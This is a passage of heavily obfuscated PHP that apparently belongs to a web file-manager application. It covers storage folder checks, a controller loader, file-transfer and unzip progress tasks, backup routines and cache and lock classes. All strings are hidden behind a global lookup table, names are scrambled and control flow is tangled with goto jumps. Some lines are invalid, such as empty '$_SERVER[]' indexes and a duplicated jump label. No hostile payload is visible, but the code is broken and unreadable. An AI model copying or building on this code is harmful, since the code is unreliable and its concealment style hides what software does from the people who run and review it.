info($F└ϡ) { if ($this->isFolder($F└ϡ)) { return $this->folderInfo($F└ϡ); } else { if ($this->isFile($F└ϡ)) { return $this->fileInfo($F└ϡ); } } return !1; } public function exist($AՑ) { return $this->isFile($AՑ) || $this->isFolder($AՑ); } public function isFile($dת) { return !$this->isFolder($dת) && $this->objectMeta($dת); } public function isFolder($b׆ב) { return $this->cacheMethod($_SERVER[ԥ][219], $b׆ב); } protected function objectMeta($E񔬄) { return $this->cacheMethod($_SERVER[ԥ][220], $E񔬄); } protected function _objectMeta($e䉭) { $B =& $_SERVER[ԥ]; $e䉭 = rtrim($e䉭, $B[8]); try { $Eϣ蛖 = $this->client->getObjectInfo($this->bucket, $e䉭); if (!isset($Eϣ蛖[$B[203]]) && isset($Eϣ蛖[$B[221]])) { $Eϣ蛖[$B[203]] = $Eϣ蛖[$B[221]]; } } catch (OSS\Core\OssException $F) { $Eϣ蛖 = !1; } if (!$Eϣ蛖) { } return $Eϣ蛖; } protected function _isFolder($eڈ) { goto a; dΌۃ: $E = $this->client->getBucket($this->bucket, $eڈ, null, 1); if (empty($E)) { return !1; } $E = array_values($E); goto dŵ; dŵ: if (substr($E[0][$f[28]], -1) == $f[8]) { return !0; } if (get_path_this($E[0][$f[28]]) == get_path_this($eڈ)) { return !1; } return !0; goto aٌ; a: $f =& $_SERVER[ԥ]; $eڈ = rtrim($eڈ, $f[8]); if ($eڈ == $f[33] || $eڈ == $f[8]) { return !0; } goto dΌۃ; aٌ: } } define($_SERVER[ԥ][222], 1); goto a; c: function Action($f = '') { goto a; E: if (isset($bُ[$Cݵ])) { return $bُ[$Cݵ]; } $f = trim(str_replace($fې[4], $fې[5], $f), $fې[4]); $fЃ = explode($fې[5], $f); goto f˶; c׍: if (isset($bُ[$Fݍ])) { return $bُ[$Fݍ]; } if (is_file($Dٝ)) { include_once $Dٝ; } if (!class_exists($Bɯ)) { return actionCallError("\x5b{$f}\x20\x3d\x3e\40{$Bɯ}\135\x20\x63\154\x61\x73\x73\40\156\157\164\40\145\170\151\163\x74\x73\x21"); } goto A; A: $bُ[$Fݍ] = new $Bɯ(); $bُ[$Cݵ] = $bُ[$Fݍ]; return $bُ[$Fݍ]; goto DӍ; f˶: $cǆ = strtolower($fЃ[0]); if (substr($cǆ, -6) == $fې[6]) { $f = substr($fЃ[0], 0, -6); $Bɯ = $f . $fې[7]; $Dٝ = $fې[8]; if (isset($fЃ[1]) && substr(strtolower($fЃ[1]), -5) == $fې[9]) { $Bɯ = $f . $fЃ[1]; $Dٝ = $fې[10] . $fЃ[1] . $fې[11]; } else { if (count($fЃ) == 3) { $Bɯ = $f . $fЃ[1] . $fЃ[2]; $Dٝ = $fې[12] . $fЃ[1] . $fې[13] . $fЃ[2] . $fې[11]; } } $Dٝ = PLUGIN_DIR . $f . $fې[4] . $Dٝ; } else { if (substr($cǆ, -5) == $fې[9]) { $f = substr($fЃ[0], 0, -5); return Model($f); } else { $Bɯ = $fЃ[0] . $fЃ[1]; $Dٝ = CONTROLLER_DIR . $fЃ[0] . $fې[4] . $fЃ[1] . $fې[14]; } } $Fݍ = strtolower($Bɯ); goto c׍; a: $fې =& $_SERVER[]; static $bُ = array(); $Cݵ = $f; goto E; DӍ: } function ActionApply($fԦ, $d֚ą = array()) { goto eӄ; cʍ: if (!method_exists($a, $AҔҾ)) { return actionCallError("{$fԦ}\x20\x6d\145\x74\x68\x6f\x64\x20\x6e\157\164\40\x65\x78\x69\x73\164\163\41"); } $c = call_user_func_array(array($a, $AҔҾ), $d֚ą); return $c; goto Fñ; E𦰶: $Aа = substr($fԦ, 0, $C); $AҔҾ = substr($fԦ, $C + 1); $a = Action($Aа); goto cʍ; eӄ: if (is_array($fԦ)) { return call_user_func_array($fԦ, $d֚ą); } if (function_exists($fԦ)) { return call_user_func_array($fԦ, $d֚ą); } $C = strrpos($fԦ, $_SERVER[][5]); goto E𦰶; Fñ: } function actionCallError($bڴ) { $E׈ =& $_SERVER[]; $e用 = json_encode_force(array($E׈[15] => this_url(), $E׈[16] => $GLOBALS[$E׈[16]])); $e用 = str_replace(array($E׈[17]), array($E׈[4]), $e用); return write_log($bڴ . $E׈[18] . $e用, $E׈[19]); } goto fɚ; dÒ: class TaskFileTransfer extends Task { protected function startAfter() { goto e§; bٝ: Hook::bind($f[539], array($this, $f[1436])); Hook::bind($f[505], array($this, $f[1437])); Hook::bind($f[502], array($this, $f[1437])); goto dՋ윘; Cҳ: Hook::bind($f[1428], array($this, $f[1429])); Hook::bind($f[1430], array($this, $f[1431])); Hook::bind($f[1432], array($this, $f[1433])); goto dُ͓; BȂ: if (!$B[$f[1312]]) { $B[$f[1312]] = LNG($f[1453]); } goto bʩ; dɸϋ: $B[$f[1447]] = LNG($f[1448]); $B[$f[1449]] = 0; $B[$f[1450]] = 0; goto Bԧ; e§: $f =& $_SERVER[ԥ]; $B =& $this->task; $this->sourceCopyFolder = !1; goto Cҳ; dُ͓: Hook::bind($f[535], array($this, $f[1434])); Hook::bind($f[536], array($this, $f[1435])); Hook::bind($f[538], array($this, $f[1436])); goto bٝ; F仓: Hook::bind($f[1441], array($this, $f[1442])); Hook::bind($f[1443], array($this, $f[1444])); Hook::bind($f[1445], array($this, $f[1446])); goto dɸϋ; dՋ윘: Hook::bind($f[507], array($this, $f[1437])); Hook::bind($f[509], array($this, $f[1437])); Hook::bind($f[511], array($this, $f[1437])); goto C; C: Hook::bind($f[1438], array($this, $f[1439])); Hook::bind($f[528], array($this, $f[1440])); $this->sourceModelCopyFlag = !1; goto F仓; Bԧ: $B[$f[963]] = $f[33]; $B[$f[1451]] = $f[33]; $B[$f[1452]] = 0; goto BȂ; bʩ: } protected function endAfter() { goto d⨇; A˔: Hook::unbind($E[1441], array($this, $E[1442])); Hook::unbind($E[1443], array($this, $E[1444])); Hook::unbind($E[1445], array($this, $E[1446])); goto bͩ˜; Că滩: Hook::unbind($E[1432], array($this, $E[1433])); Hook::unbind($E[535], array($this, $E[1434])); Hook::unbind($E[536], array($this, $E[1435])); goto Bʬ; Bʬ: Hook::unbind($E[538], array($this, $E[1436])); Hook::unbind($E[539], array($this, $E[1436])); Hook::unbind($E[505], array($this, $E[1437])); goto AӅ; d⨇: $E =& $_SERVER[ԥ]; Hook::unbind($E[1428], array($this, $E[1429])); Hook::unbind($E[1430], array($this, $E[1431])); goto Că滩; B쾉թ: Hook::unbind($E[511], array($this, $E[1437])); Hook::unbind($E[1438], array($this, $E[1439])); Hook::unbind($E[528], array($this, $E[1440])); goto A˔; AӅ: Hook::unbind($E[502], array($this, $E[1437])); Hook::unbind($E[507], array($this, $E[1437])); Hook::unbind($E[509], array($this, $E[1437])); goto B쾉թ; bͩ˜: } public function copyMoveStart($c, $F, $Bֶڸ, $aˊ) { } public function updateAfter() { goto D; CҼĞ: if ($this->sourceModelCopyFlag) { return; } $bݶɉ = 0; if ($C[$Dޓȫ[1451]] == $Dޓȫ[1023]) { $bݶɉ = $C[$Dޓȫ[1450]] * 0.5; } else { if ($C[$Dޓȫ[1451]] == $Dޓȫ[102]) { $bݶɉ = $C[$Dޓȫ[1450]] * 0.5 + $C[$Dޓȫ[1449]] * 0.5; } } goto fۭ; fۭ: $C[$Dޓȫ[1405]] = ($C[$Dޓȫ[1454]] + $bݶɉ) / $C[$Dޓȫ[682]]; if ($C[$Dޓȫ[1405]] > 0) { $Eޢ = timeFloat() - $C[$Dޓȫ[1407]] - $C[$Dޓȫ[1410]]; $C[$Dޓȫ[1411]] = $Eޢ * (1 - $C[$Dޓȫ[1405]]) / $C[$Dޓȫ[1405]]; } goto e; D: $Dޓȫ =& $_SERVER[ԥ]; $C =& $this->task; if (!$C[$Dޓȫ[682]]) { return; } goto CҼĞ; e: } public function addPath($a砃) { goto F; cʦ: if ($DǤ[$c[29]] == $c[163]) { $CѩϞץ[$c[961]] += 1; } else { $CѩϞץ[$c[961]] += $DǤ[$c[80]][$c[78]]; if ($DǤ[$c[365]]) { $CѩϞץ[$c[961]] += $DǤ[$c[80]][$c[79]] + 1; } } $CѩϞץ[$c[682]] += $DǤ[$c[77]]; $this->update(); goto A; Bʊ: $DǤ = IO::infoWithChildren($a砃); $E猵 = $CѩϞץ[$c[1455]] ? $CѩϞץ[$c[1455]][$c[1456]] : 0; $CѩϞץ[$c[1455]] = array($c[1456] => $E猵 + 1, $c[382] => $DǤ[$c[28]], $c[75] => $DǤ[$c[75]], $c[462] => $DǤ[$c[462]] ? $DǤ[$c[462]] : $DǤ[$c[75]]); goto cʦ; F: $c =& $_SERVER[ԥ]; if (!$a砃) { return; } $CѩϞץ =& $this->task; goto Bʊ; A: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($eÃ) { $aΑ =& $_SERVER[ԥ]; $AĒ =& $this->task; $AĒ[$aΑ[1447]] = $eÃ[$aΑ[28]]; $AĒ[$aΑ[963]] = $eÃ[$aΑ[28]]; $this->update(); } public function copyFileStart($e, $Eďۛ, $d, $Aҭغ, $CÎ, $cРߩ) { goto F; bœ: $this->update(); goto F; e⨫ڽ: $GLOBALS[$b[1458]] = $CÎ; $GLOBALS[$b[1457]] = $cРߩ; $D =& $this->task; goto c; FƢ: $D[$b[963]] = $b[33]; $D[$b[1451]] = $b[33]; $D[$b[1452]] = 0; goto bœ; F: $b =& $_SERVER[ԥ]; $f = $CÎ; if ($f == $GLOBALS[$b[1457]]) { $f = $GLOBALS[$b[1458]]; } goto e⨫ڽ; c: $D[$b[1447]] = $f; $D[$b[1449]] = (int) $e->size($Eďۛ); $D[$b[1450]] = 0; goto FƢ; F: } public function copyFileEnd($d, $Fʇ, $a, $bճ, $bɼ, $A) { $eۆ =& $_SERVER[ԥ]; $f苹 =& $this->task; $f苹[$eۆ[1450]] = $f苹[$eۆ[1449]]; $f苹[$eۆ[1451]] = $eۆ[33]; if ($bɼ == $f苹[$eۆ[1447]]) { $f苹[$eۆ[1454]] += $f苹[$eۆ[1449]]; $this->update(1); } else { $this->update(); $f苹[$eۆ[1450]] = 0; } self::log($eۆ[1459] . $Fʇ . $eۆ[66] . $bճ . $eۆ[213] . $bɼ . $eۆ[1460] . $f苹[$eۆ[1447]]); } public function updateFileEnd($fǌ, $C˿) { $c؋ =& $_SERVER[ԥ]; $eڮ =& $this->task; $eڮ[$c؋[1447]] = $fǌ; $eڮ[$c؋[1449]] = $C˿; $eڮ[$c؋[1454]] += $C˿; $this->update(1); } public function sourceModelCopy($e) { goto fҲ; D: $E҂ =& $this->task; $this->sourceModelCopyFlag = !0; $cቒ = 0; goto C𬊚; C𬊚: switch ($D) { case $Aͅռ[503]: $cቒ = 1; break; case $Aͅռ[506]: $E҂[$Aͅռ[1447]] = $Cֆ[$Aͅռ[28]]; break; case $Aͅռ[508]: $cቒ = intval($e[$Aͅռ[359]] * 0.4); break; case $Aͅռ[510]: $cቒ = intval($e[$Aͅռ[359]] * 0.2); break; case $Aͅռ[512]: $cቒ = intval($e[$Aͅռ[359]] * 0.4); break; } $this->update($cቒ); $this->sourceModelCopyFlag = !1; goto dؖڄ; fҲ: $Aͅռ =& $_SERVER[ԥ]; $D = $e[0]; $Cֆ = $e[1]; goto D; dؖڄ: } public function sourceRemove($EĤ, $Aո) { $EԾ =& $_SERVER[ԥ]; $this->sourceModelCopyFlag = !0; $eۍ = 1; if (isset($EĤ[$EԾ[80]])) { $eۍ = $EĤ[$EԾ[80]][$EԾ[78]] + $EĤ[$EԾ[80]][$EԾ[79]] + 1; } $this->update($eۍ); $this->sourceModelCopyFlag = !1; } public function sourceMove($b) { $this->sourceRemove($b, !1); } public function curlProgress($Dë, $cՂǐ, $e, $e, $C՟͕) { $f˧ =& $_SERVER[ԥ]; $b۶ =& $this->task; if ($C՟͕ > 0) { $b۶[$f˧[963]] = $f˧[1461]; $b۶[$f˧[1451]] = $f˧[102]; if ($b۶[$f˧[1449]] == $e || $e > 1024 * 1024) { $b۶[$f˧[1450]] = $C՟͕; } if ($b۶[$f˧[1452]]) { $b۶[$f˧[1450]] = $C՟͕ + $b۶[$f˧[1452]]; } } else { if ($e > 0) { if ($b۶[$f˧[1449]] == $cՂǐ) { $b۶[$f˧[1450]] = $e; $b۶[$f˧[963]] = $f˧[1462]; $b۶[$f˧[1451]] = $f˧[1023]; } } } $this->update(); } public function curlProgressStart($f؅) { } public function curlProgressEnd($dÐٽ) { $DƦʈ =& $_SERVER[ԥ]; $çε =& $this->task; $Ḋ = curl_getinfo($dÐٽ); $F搮 = $Ḋ[$DƦʈ[1463]]; if ($çε[$DƦʈ[1451]] == $DƦʈ[102] && $F搮) { $çε[$DƦʈ[1452]] += $F搮; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $BË =& $_SERVER[ԥ]; Hook::bind($BË[1441], array($this, $BË[1464])); Hook::bind($BË[1443], array($this, $BË[1465])); Hook::bind($BË[1445], array($this, $BË[1466])); } protected function endAfter() { $eʠ =& $_SERVER[ԥ]; Hook::unbind($eʠ[1441], array($this, $eʠ[1464])); Hook::unbind($eʠ[1443], array($this, $eʠ[1465])); Hook::unbind($eʠ[1445], array($this, $eʠ[1466])); } public function progressStart($C銿) { $C =& $_SERVER[ԥ]; $d = curl_getinfo($C銿); self::log($C[1467] . $d[$C[291]]); self::valueSet($this->task[$C[363]], $this->task); } public function progressEnd($Cܸ) { $Dԃ =& $_SERVER[ԥ]; self::log($Dԃ[1468] . $this->task[$Dԃ[363]]); $this->end(); } public function progress($fǞͱ, $a, $e۔܇Ѓ, $D܆, $CҰ誫) { $c =& $_SERVER[ԥ]; $bم =& $this->task; if ($CҰ誫 > 0) { $bم[$c[961]] = $bم[$c[961]] == 0 ? $D܆ : $bم[$c[961]]; $bم[$c[973]] = $CҰ誫; } else { if ($e۔܇Ѓ > 0) { $bم[$c[961]] = $bم[$c[961]] == 0 ? $a : $bم[$c[961]]; $bم[$c[973]] = $e۔܇Ѓ; } } $this->update(); self::log("\x70\162\157\x67\x72\145\x73\x73\x48\164\164\160\x3a\144\x6f\167\156\x3a{$e۔܇Ѓ}\x2f{$a}\x3b\x20\165\x70\x6c\157\x61\x64\72{$CҰ誫}\57{$D܆}\73"); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto C; Eޏ: Hook::bind($d݅隚[1018], array($this, $d݅隚[1471])); $dѹ =& $this->task; $dѹ[$d݅隚[1472]] = $d݅隚[1023]; goto AÔ; AÔ: if (!$dѹ[$d݅隚[1312]]) { $dѹ[$d݅隚[1312]] = LNG($d݅隚[1473]); } goto b։߅; C: $d݅隚 =& $_SERVER[ԥ]; parent::startAfter(); Hook::bind($d݅隚[1469], array($this, $d݅隚[1470])); goto Eޏ; b։߅: } protected function endAfter() { $B˥ߝ =& $_SERVER[ԥ]; parent::endAfter(); Hook::unbind($B˥ߝ[1469], array($this, $B˥ߝ[1470])); Hook::unbind($B˥ߝ[1018], array($this, $B˥ߝ[1471])); } public function updateAfter() { $f، =& $_SERVER[ԥ]; $Bΰ =& $this->task; if (!$Bΰ[$f،[961]] || !$Bΰ[$f،[682]]) { return; } if ($Bΰ[$f،[1472]] == $f،[1023]) { $aˠ̡ = 0; if ($Bΰ[$f،[1449]]) { $aˠ̡ = $Bΰ[$f،[1450]] / $Bΰ[$f،[1449]]; } $Bΰ[$f،[1405]] = $aˠ̡ * 0.3; } else { if ($Bΰ[$f،[1472]] == $f،[297]) { $aˠ̡ = $Bΰ[$f،[973]] / $Bΰ[$f،[961]]; $Bΰ[$f،[1405]] = 0.3 + $aˠ̡ * 0.4; } else { if ($Bΰ[$f،[1472]] == $f،[102]) { $f = 0; if ($Bΰ[$f،[1451]] == $f،[102]) { $f = $Bΰ[$f،[1450]]; } $aˠ̡ = ($Bΰ[$f،[1454]] + $f) / $Bΰ[$f،[682]]; $Bΰ[$f،[1405]] = 0.3 + 0.4 + $aˠ̡ * 0.3; } } } if ($Bΰ[$f،[1405]] > 0) { $c͖ = timeFloat() - $Bΰ[$f،[1407]] - $Bΰ[$f،[1410]]; $Bΰ[$f،[1411]] = $c͖ * (1 - $Bΰ[$f،[1405]]) / $Bΰ[$f،[1405]]; } } public function addFile($cƍ) { goto E퓠Т; dɐﵔ: $this->update(); goto F쮂ѽ; aڇ: $D[$E[1447]] = $A㮲ɑ[$E[28]]; $D[$E[1449]] = $A㮲ɑ[$E[77]]; $D[$E[1450]] = 0; goto Eۛ܎; E퓠Т: $E =& $_SERVER[ԥ]; $D =& $this->task; $A㮲ɑ = IO::info($cƍ); goto aڇ; Eۛ܎: $D[$E[963]] = $E[1462]; $D[$E[1451]] = $E[1023]; $D[$E[682]] = $A㮲ɑ[$E[77]]; goto b; b: $D[$E[961]] = 1; $d夗 = 0; $D[$E[1455]] = array($E[1456] => $d夗 + 1, $E[382] => $A㮲ɑ[$E[28]], $E[75] => $A㮲ɑ[$E[75]], $E[462] => $A㮲ɑ[$E[462]] ? $A㮲ɑ[$E[462]] : $A㮲ɑ[$E[75]]); goto dɐﵔ; F쮂ѽ: } public function unzipAfter($b) { goto Dыϭ; Dыϭ: $c =& $_SERVER[ԥ]; $a =& $this->task; $a[$c[1472]] = $c[102]; goto cֳǙ; cֳǙ: $cԫ = IO::infoWithChildren($b); $Bט = 0; $a[$c[1455]] = array($c[1456] => $Bט + 1, $c[382] => $cԫ[$c[28]], $c[75] => $cԫ[$c[75]], $c[462] => $cԫ[$c[462]] ? $cԫ[$c[462]] : $cԫ[$c[75]]); goto DՉڣ; a: $a[$c[1447]] = $c[33]; $a[$c[1454]] = 0; $a[$c[682]] = $cԫ[$c[77]]; goto b; aЌ: $a[$c[973]] = 0; $a[$c[1449]] = 0; $a[$c[1450]] = 0; goto a; b: $this->update(); self::log($c[1474] . json_encode(array($a, $cԫ))); goto D΋; DՉڣ: if ($cԫ[$c[29]] == $c[163]) { $a[$c[961]] = 1; } else { $a[$c[961]] = $cԫ[$c[80]][$c[78]]; } $a[$c[963]] = $c[33]; $a[$c[1451]] = 0; goto aЌ; D΋: } public function nameParse($Aʫ) { goto C; B̞: $this->update(); goto f; C: $bӚ鑧 =& $_SERVER[ԥ]; $cΞ =& $this->task; if ($cΞ[$bӚ鑧[1472]] == $bӚ鑧[1023]) { $cΞ[$bӚ鑧[1472]] = $bӚ鑧[297]; $cΞ[$bӚ鑧[1454]] = 0; $cΞ[$bӚ鑧[682]] = 0; } goto Ḃ; Ḃ: $d = get_path_this($Aʫ); if (strstr($d, $bӚ鑧[91])) { $cΞ[$bӚ鑧[973]] += 1; $cΞ[$bӚ鑧[961]] += 1; } $cΞ[$bӚ鑧[1447]] = $Aʫ; goto B̞; f: } } goto E; Bڒ: class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $d =& $_SERVER[ԥ]; self::$name = date($d[671]); if (!($Aڌђ = Model($d[672])->lastItem())) { $Aڌђ = $this->initData(); } else { self::$name = $Aڌђ[$d[28]]; if ($Aڌђ[$d[673]] == $d[83]) { self::$name = date($d[674]); $d = 0; if (isset($Aڌђ[$d[277]][$d[163]][$d[415]])) { $d = (int) $Aڌђ[$d[277]][$d[163]][$d[415]]; } if ($Aڌђ[$d[28]] == self::$name) { Model($d[672])->remove($Aڌђ[$d[363]]); } $Aڌђ = $this->initData($d, $Aڌђ[$d[675]]); } else { $this->checkStore($Aڌђ[$d[675]]); } } self::$option = $Aڌђ; } private function initData($f퉯 = 0, $aѷ = '') { goto Fϧσ; A΋ě: $fڴӷ[$D۽[363]] = $cٮ䣨; return $fڴӷ; goto dˌ; dװ: $this->checkStore($B[$D۽[675]]); $fڴӷ = array($D۽[675] => $B[$D۽[675]], $D۽[28] => self::$name, $D۽[673] => 0, $D۽[676] => $B[$D۽[676]], $D۽[277] => array($D۽[677] => array($D۽[673] => 0), $D۽[678] => array($D۽[673] => 0, $D۽[679] => 0, $D۽[680] => 0, $D۽[29] => $D۽[33]), $D۽[681] => array($D۽[673] => 0, $D۽[679] => 0, $D۽[680] => 0), $D۽[163] => array($D۽[673] => 0, $D۽[682] => 0, $D۽[683] => 0, $D۽[684] => 0, $D۽[685] => 0, $D۽[415] => $f퉯)), $D۽[686] => time(), $D۽[687] => 0); $cٮ䣨 = Model($D۽[672])->insert($fڴӷ); goto A΋ě; Fϧσ: $D۽ =& $_SERVER[ԥ]; $B = Model($D۽[672])->config(); if ($aѷ && $B[$D۽[675]] != $aѷ) { $f퉯 = 0; } goto dװ; dˌ: } private function checkStore($Dץ) { $e =& $_SERVER[ԥ]; $AӍ = Model($e[688])->listData($Dץ); Model($e[688])->checkConfig($AӍ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ԥ][672])->findByName(self::$name); } return self::$option; } public static function set($a) { $c =& $_SERVER[ԥ]; $C = self::get(); foreach ($a as $A => $c冹) { $d = explode($c[91], $A); $EɈ = count($d); switch ($EɈ) { case 1: $C[$d[0]] = $c冹; break; case 2: $C[$d[0]][$d[1]] = $c冹; break; case 3: $C[$d[0]][$d[1]][$d[2]] = $c冹; break; } } Model($c[672])->update($C[$c[363]], $C); self::$option = $C; return self::$option; } public function keep() { $B =& $_SERVER[ԥ]; $E = self::get(); if ($E[$B[277]][$B[677]][$B[673]] == $B[83]) { return; } $this->backupKeep($E); self::set(array($B[689] => 1)); } private function backupKeep($FϞ߹) { goto Cι; Cι: $F =& $_SERVER[ԥ]; $Cԏ» = Model($F[672])->listData(); if (empty($Cԏ»)) { return; } goto Aȋ; Dߋ: for ($cƚ = 0; $cƚ < 12; $cƚ++) { $E΂˄[] = date($F[690], strtotime("\55{$cƚ}\40\155\157\156\164\x68\163")); } $E΂˄ = array_unique($E΂˄); foreach ($Cԏ» as $f) { if (!empty($f[$F[28]]) && in_array($f[$F[28]], $E΂˄)) { continue; } Model($F[672])->remove($f[$F[363]]); $aӤ = "\173\x69\157\x3a{$FϞ߹[$F[675]]}\x7d\x2f\x64\x61\164\141\x62\x61\x73\145\57\142\x61\x63\x6b\x75\160\x5f{$f[$F[28]]}"; IO::remove($aӤ, !1); } goto D߅; Aȋ: $cƚ = 0; $E΂˄ = array(); foreach ($Cԏ» as $f) { if ($cƚ >= 7) { break; } $E΂˄[] = $f[$F[28]]; $cƚ++; } goto Dߋ; D߅: } public function db() { goto E˶; E˶: $F܊΢ =& $_SERVER[ԥ]; $B׻ = self::get(); if ($B׻[$F܊΢[277]][$F܊΢[678]][$F܊΢[673]] == $F܊΢[83]) { return !0; } goto e؞; CÝ: return !0; goto Eџ; e؞: $E셦 = new BackupDb(); if (!$E셦->index()) { return !1; } self::set(array($F܊΢[691] => 1)); goto CÝ; Eџ: } public function dbFile() { goto eʙ; Dݻ: $Dò = new BackupDbFile(); if (!$Dò->index()) { return !1; } self::set(array($aȰ[692] => 1)); goto dږμ; dږμ: return !0; goto d; eʙ: $aȰ =& $_SERVER[ԥ]; $EҐ = self::get(); if ($EҐ[$aȰ[277]][$aȰ[681]][$aȰ[673]] == $aȰ[83]) { return !0; } goto Dݻ; d: } public function file() { $Eǐ =& $_SERVER[ԥ]; $C = self::get(); if ($C[$Eǐ[277]][$Eǐ[163]][$Eǐ[673]] == $Eǐ[83]) { return !0; } if (!isset($C[$Eǐ[676]]) || $C[$Eǐ[676]] == $Eǐ[464]) { $bم = new BackupFile(); if (!$bم->index()) { return !1; } } self::set(array($Eǐ[693] => 1, $Eǐ[673] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto E; E: $b =& $_SERVER[ԥ]; $A⚱ = Backup::get(); self::$io = $A⚱[$b[675]]; goto bз; A鏆: $dڔ = new DbManage($BÈ, $dҽ); $bצʹ = TEMP_FILES . $b[694] . self::$name . $b[8]; del_dir($bצʹ); goto A; Fᅝ: $E͵䴐 = new Task($b[695], $b[696], 0, LNG($b[697]) . $b[698] . LNG($b[699])); $C = array_diff($C, array($b[700], $b[701])); foreach ($C as $BӴ) { $dȄ = $bצʹ . $BӴ . $b[702]; $fæ = null; if ($BӴ == $b[703] && (!isset($A⚱[$b[676]]) || $A⚱[$b[676]] == $b[464])) { $fæ = self::$io; } $aŨ += $dڔ->sqlFromDb($BӴ, $dȄ, $E͵䴐, $fæ); } goto dɨ; bз: self::$name = $A⚱[$b[28]]; $BÈ = $GLOBALS[$b[6]][$b[17]]; $dҽ = $this->_dbType($BÈ); goto A鏆; Aȩ: return !0; goto dŽ; dɨ: $E͵䴐->end(); $D؂ = array($b[704] => $dҽ, $b[691] => 1, $b[705] => $aŨ, $b[706] => $aŨ); Backup::set($D؂); goto Aȩ; A: mk_dir($bצʹ); $C = $dڔ->db()->getTables(); $aŨ = 0; goto Fᅝ; dŽ: } private function _dbType($B) { goto F̐; Fɪհ: if ($Eߤ == $bߟŪ[708]) { $dݎ = explode($bߟŪ[4], $B[$bߟŪ[709]]); $Eߤ = $dݎ[0]; } $A = array($bߟŪ[710] => $bߟŪ[9], $bߟŪ[711] => $bߟŪ[712]); if (isset($A[$Eߤ])) { $Eߤ = $A[$Eߤ]; } goto C; F̐: $bߟŪ =& $_SERVER[ԥ]; $B = array_change_key_case($B); $Eߤ = $B[$bߟŪ[707]]; goto Fɪհ; C: return $Eߤ; goto cЦ; cЦ: } } class BackupDbFile { public function __construct() { } public function index() { goto C񪦌; b: return !0; goto e; eÏ: IO::copy($c, $d䢶 . "\x62\141\143\x6b\x75\x70\x5f{$d֊ӈ}\57"); $B->end(); Backup::set(array($fɖ[717] => $b蛹[$fɖ[77]])); goto b; bŴ: Backup::set(array($fɖ[715] => $b蛹[$fɖ[77]])); IO::move($Aڳ, $d䢶); $c = CONTROLLER_DIR . $fɖ[716]; goto eÏ; C񪦌: $fɖ =& $_SERVER[ԥ]; $fޖ = Backup::get(); $d֊ӈ = $fޖ[$fɖ[28]]; goto f亜; A˚雽: $B = new TaskFileTransfer($fɖ[713], $fɖ[696], 0, LNG($fɖ[697]) . $fɖ[408] . LNG($fɖ[699]) . $fɖ[714]); $B->addPath($Aڳ); $b蛹 = IO::infoWithChildren($Aڳ); goto bŴ; f亜: $Aڳ = TEMP_FILES . "\x62\141\143\153\165\x70\x5f{$d֊ӈ}\x2f"; $d䢶 = "\173\x69\x6f\x3a{$fޖ[$fɖ[675]]}\175\57\144\x61\164\x61\142\141\x73\145\57"; IO::mkdir($d䢶 . "\142\141\143\x6b\165\160\x5f{$d֊ӈ}\x2f"); goto A˚雽; e: } } goto EӲȇ; d: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($CĄ, $fǆ) { $Cʒͦ =& $_SERVER[ԥ]; $this->cachePath = $CĄ[$Cʒͦ[75]]; $this->prefix = $Cʒͦ[752]; $this->cacheTime = $fǆ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($Cث߬) { $d =& $_SERVER[ԥ]; $Cث߬ = str_replace(array($d[753], $d[93], $d[69]), $d[754], $Cث߬); return $this->cachePath . $d[755] . $Cث߬ . $d[756]; } public function set($C, $Dߐ, $Dъ = false) { $dվѯؤ = $this->getFile($C); if (file_put_contents($dվѯؤ, $this->prefix . $Dߐ, LOCK_EX)) { return !0; } @unlink($dվѯؤ); return !1; } public function get($EǪ) { $D = $this->getFile($EǪ); if (file_exists($D) && filemtime($D) < time() - $this->cacheTime) { @unlink($D); return !1; } $E󥏌 = @file_get_contents($D); return substr($E󥏌, strlen($this->prefix)); } public function remove($F؝ַ) { $Cá = $this->getFile($F؝ַ); return @unlink($Cá); } public function deleteAll() { $fܡ =& $_SERVER[ԥ]; $c = scandir($this->cachePath); foreach ($c as $e͓ɇ) { $EߞӇ = $this->cachePath . $e͓ɇ; if (strpos($EߞӇ, $fܡ[756]) && strpos($EߞӇ, $fܡ[757])) { @unlink($EߞӇ); } } } public function clearTimeout() { $E° =& $_SERVER[ԥ]; $bŬ = scandir($this->cachePath); foreach ($bŬ as $CӦ) { $f׼ = $this->cachePath . $CӦ; if (strpos($f׼, $E°[756]) && strpos($f׼, $E°[757]) && filemtime($f׼) < time() - $this->cacheTime) { @unlink($f׼); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto b; b: $Bѯ =& $_SERVER[ԥ]; if (self::$handle) { return self::$handle; } $c̄ݰ = $GLOBALS[$Bѯ[6]][$Bѯ[333]]; goto B쳾Ղ; B쳾Ղ: self::$timeout = $c̄ݰ[$Bѯ[758]] ? $c̄ݰ[$Bѯ[758]] : 10; $E䚰 = _get($GLOBALS[$Bѯ[6]], $Bѯ[759]); $Fӕ֓ = $c̄ݰ[$Bѯ[745]] ? $c̄ݰ[$Bѯ[745]] : $Bѯ[163]; goto fɎ; fɎ: if ($Fӕ֓ == $Bѯ[17] && $E䚰 == $Bѯ[9]) { $Fӕ֓ = $Bѯ[163]; } switch ($Fӕ֓) { case $Bѯ[748]: self::$handle = new CacheLockRedis(); break; case $Bѯ[749]: self::$handle = new CacheLockMemcached(); break; case $Bѯ[17]: self::$handle = new CacheLockDatabase(); break; case $Bѯ[163]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto C; C: } private static function key($Dշ) { return $_SERVER[ԥ][760] . Cache::key($Dշ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($fƫ = '') { self::$errorMsg = $fƫ; } public static function lockGlobal($dƏ, $cȍ) { return self::lock($dƏ, $cȍ, !0); } public static function lock($Aי, $D퍢æ = false, $c = false) { goto E; f: if (!$c) { self::$lockItem[$fȉ] = !0; } return $fﲈ; goto B͋; E: $FϮ =& $_SERVER[ԥ]; $d憖ߵ = self::init(); $fȉ = self::key($Aי); goto f蘻; f蘻: $D퍢æ = $D퍢æ ? $D퍢æ : self::$timeout; $fﲈ = $d憖ߵ->lock($fȉ, $D퍢æ); if 